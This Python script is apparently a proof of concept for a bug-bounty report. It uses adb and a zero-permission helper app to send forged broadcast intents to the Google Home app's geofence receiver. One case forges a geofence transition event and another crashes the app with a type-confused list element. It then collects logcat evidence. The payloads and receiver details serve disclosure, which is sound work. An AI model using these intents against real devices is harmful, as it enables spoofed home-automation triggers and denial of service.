#!/usr/bin/env python3
"""
Final confirmation: reproduce both impacts from a clean device state and write one
consolidated evidence file for the VRP report.
"""
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import capture as C

CH = "com.google.android.apps.chromecast.app"
RCV = "com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver"
T = "com.google.android.location.intent.extra.transition"
GFL = "com.google.android.location.intent.extra.geofence_list"
LOC = "com.google.android.location.intent.extra.triggering_location"
OUT = os.path.join(C.EVID, "GH_GEOFENCE_FINAL_EVIDENCE.txt")

CASES = [
    ("A. INTEGRITY — forged well-formed geofence event",
     {"type": "forgeGeo", "geofenceId": "ATTACKER_CONTROLLED_GEOFENCE",
      "lat": 12.9716, "lng": 77.5946, "radius": 150.0, "transition": 1, "errorCode": 0}),
    ("B. AVAILABILITY — type-confusion element crashes Google Home",
     {"type": "broadcast", "action": "com.google.android.apps.chromecast.app.gf.GF_TRANSITION",
      "component": RCV,
      "extras": {"gms_error_code": 0, T: 1, GFL: ["a-string-element"],
                 LOC: {"location": {"lat": 12.9716, "lng": 77.5946, "accuracy": 5}}}}),
]

PATTERNS = [
    ("probe", re.compile(r"VRPPROBE")),
    ("receiver accepted the event", re.compile(r"Gf event error|Geofencing event error")),
    ("FATAL EXCEPTION", re.compile(r"FATAL EXCEPTION")),
    ("root cause", re.compile(r"Caused by: java\.lang\.\w+Exception")),
    ("crash frame in Google Home", re.compile(r"GeofenceTransitionBroadcastReceiver\.onReceive")),
    ("reached GMS protobuf parser", re.compile(r"ParcelableGeofence\.<init>|adme\.createFromParcel")),
    ("Google Home pipeline", re.compile(r"GeofenceTransitionReportingWorker|currentHome is null|Could not find home")),
    ("AndroidRuntime process line", re.compile(r"AndroidRuntime.*Process: com\.google\.android\.apps\.chromecast\.app")),
]


def main():
    subprocess.run("adb logcat -c", shell=True)
    chunks = []
    for title, cmd in CASES:
        subprocess.run(f"adb shell am force-stop {CH}", shell=True)
        time.sleep(1)
        subprocess.run(f"adb shell monkey -p {CH} -c android.intent.category.LAUNCHER 1",
                       shell=True, capture_output=True)
        time.sleep(3)
        pid = subprocess.run(f"adb shell pidof {CH}", shell=True,
                             capture_output=True, text=True).stdout.strip()
        subprocess.run("adb logcat -c", shell=True)
        with open("/tmp/vrp_cmd.json", "w") as fh:
            import json
            fh.write(json.dumps(cmd))
        subprocess.run("mkdir -p /sdcard/Android/data/com.vrp.probe/files", shell=True)
        subprocess.run(["adb", "push", "/tmp/vrp_cmd.json",
                        "/sdcard/Android/data/com.vrp.probe/files/cmd.json"],
                       capture_output=True)
        subprocess.run("adb shell am broadcast -a com.vrp.probe.EXEC -p com.vrp.probe "
                       "--include-stopped-packages", shell=True, capture_output=True)
        time.sleep(6)
        log = subprocess.run("adb logcat -d -v time", shell=True,
                             capture_output=True, text=True).stdout
        chunks.append((title, cmd, pid, log))
        print(f"\n########## {title}  (target pid before: {pid or 'none'})")
        printed = 0
        for ln in log.splitlines():
            if any(p.search(ln) for _, p in PATTERNS):
                print("  " + ln[:250])
                printed += 1
                if printed > 40:
                    break
        print(f"  [{printed} matching lines]")

    with open(OUT, "w") as fh:
        fh.write("=" * 110 + "\n")
        fh.write("GOOGLE HOME GEOFENCE INJECTION - CONSOLIDATED EVIDENCE\n")
        fh.write("Device: Pixel 6a (bluejay) | Android 17 (API 37) | build CP41.260814.003.A2\n")
        fh.write("Attacker: com.vrp.probe, UID 10362, ZERO declared Android permissions\n")
        fh.write("=" * 110 + "\n\n")
        for title, cmd, pid, log in chunks:
            import json as J
            fh.write("#" * 110 + f"\n### {title}\n")
            fh.write(f"CMD: {J.dumps(cmd)}\n")
            fh.write(f"google home pid before: {pid}\n")
            fh.write("-" * 110 + "\n")
            for ln in log.splitlines():
                if any(p.search(ln) for _, p in PATTERNS):
                    fh.write(ln[:300] + "\n")
            fh.write("\n")
    print(f"\nCONSOLIDATED -> {OUT}")


if __name__ == "__main__":
    main()